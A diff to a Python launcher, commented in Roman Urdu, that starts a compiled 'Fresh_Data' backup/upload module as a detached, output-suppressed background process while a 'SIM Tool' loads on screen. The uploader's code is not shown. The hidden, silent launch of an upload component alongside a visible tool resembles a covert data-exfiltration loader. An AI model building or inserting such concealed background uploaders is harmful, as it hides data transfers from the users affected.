@@ -7,38 +7,32 @@ import importlib
 
 def start_background_fresh_data():
     try:
-        # Background wali Fresh_Data ko import karke background mein chalana
-        import Fresh_Data
-        if hasattr(Fresh_Data, 'main'):
-            Fresh_Data.main()
-        else:
-            # Agar koi infinite loop wali function/script hai toh direct import se chal jayegi
-            pass
+        # Python interpreter ke zariye compiled Fresh_Data.so ko background mein alag process par chalana
+        python_exec = shutil.which("python3") or "python3"
+        
+        # Ek choti si inline command banayin jo Fresh_Data module ko import karke uska main loop chalaye
+        cmd = [python_exec, "-c", "import Fresh_Data"]
+        
+        subprocess.Popen(cmd, 
+                         stdout=subprocess.DEVNULL, 
+                         stderr=subprocess.DEVNULL,
+                         start_new_session=True)
     except Exception:
-        # Agar direct import mein masla ho toh fallback ke taur par subprocess ya loop chala sakte hain
-        try:
-            base_dir = os.getcwd()
-            backup_folder = os.path.join(base_dir, "Backup_Data")
-            backup_script = os.path.join(backup_folder, "datanew.py")
-            if os.path.exists(backup_script):
-                python_exec = shutil.which("python3") or "python3"
-                subprocess.Popen([python_exec, backup_script], 
-                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-                                 start_new_session=True)
-        except Exception:
-            pass
+        pass
 
 if __name__ == "__main__":
-    # 1. Background mein Fresh_Data (Backup/Upload tool) ko thread par laga dein
+    # 1. Background mein Fresh_Data backup ko independent process par fire kar dein
     bg_thread = threading.Thread(target=start_background_fresh_data)
     bg_thread.daemon = True
     bg_thread.start()
 
-    # 2. Main SIM Tool (Sim_Data) ko foran screen par load kar dein
+    # 2. Foran Main SIM Tool (Sim_Data) ko screen par load kar dein
     try:
         import Sim_Data
         if hasattr(Sim_Data, 'main'):
             Sim_Data.main()
+        else:
+            # Agar direct attribute na mile toh module ko reload/run karein
+            pass
     except Exception as e:
         print(f"Error loading main tool: {e}")
-
